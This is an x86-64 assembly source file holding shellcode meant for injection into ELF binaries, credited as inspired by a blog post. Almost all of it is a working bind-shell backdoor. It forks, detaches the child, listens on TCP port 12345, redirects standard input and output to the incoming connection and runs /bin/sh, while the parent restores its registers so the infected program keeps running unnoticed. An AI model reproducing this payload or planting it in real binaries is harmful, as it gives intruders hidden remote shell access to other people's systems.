; Shellcode inpired fro https://www.matteomalvica.com/blog/2019/05/18/injecting-shellcode-into-x64-elf-binaries/
BITS 64

SECTION .text
global main

section .text

main:
  push rax         ; save all clobbered registers
  push rcx               
  push rdx
  push rsi
  push rdi
  push r11

  ;fork
  xor rax,rax
  add rax,57
  syscall
  cmp eax, 0
  jnz parent
;On success, the PID of the child process is returned in the parent,
;and 0 is returned in the child.

child:  
  ;setsid
  mov rax, 112
  syscall
  ; socket
  xor eax,eax
  xor ebx,ebx
  xor edx,edx
  ;socket
  mov al,0x1
  mov esi,eax
  inc al
  mov edi,eax
  mov dl,0x6
  mov al,0x29      ; sys_socket (syscall 41)
  syscall

  xchg ebx,eax

  ; bind
  xor  rax,rax
  push   rax
  push 0x39300102 ; port 12345
  mov  [rsp+1],al
  mov  rsi,rsp
  mov  dl,16
  mov  edi,ebx
  mov  al,0x31     ; sys_bind (syscall 49)
  syscall

  ;listen
  mov  al,0x5
  mov esi,eax
  mov  edi,ebx
  mov  al,0x32     ; sys_listen (syscall 50)
  syscall

  ;accept
  xor edx,edx
  xor esi,esi
  mov edi,ebx
  mov al,0x2b      ; sys_accept (43)
  syscall
  mov edi,eax      ; store socket

  ;dup2
  xor rax,rax
  mov esi,eax
  mov al,0x21      ; sys_dup2 (syscall 33)
  syscall
  inc al
  mov esi,eax
  mov al,0x21
  syscall
  inc al
  mov esi,eax
  mov al,0x21
  syscall

  ;exec
  xor rdx,rdx
  mov rbx,0x68732f6e69622fff ;echo -ne "\x68\x73\x2f\x6e\x69\x62\x2f"  hs/nib/ shift 1byte to generate 0byte /bin/sh\x00 little endian
  shr rbx,0x8
  push rbx
  mov rdi,rsp ; ;/bin/sh
  xor rax,rax
  push rax
  push rdi
  mov  rsi,rsp ; argv
  mov al,0x3b      ; sys_execve (59)
  syscall

  mov     rbx,0    ; Exit code ; um? why rbx and not rdi?
  mov     rax,60   ; SYS_EXIT
  syscall



parent:
  pop r11          ; restore all registers
  pop rdi
  pop rsi
  pop rdx
  pop rcx
  pop rax
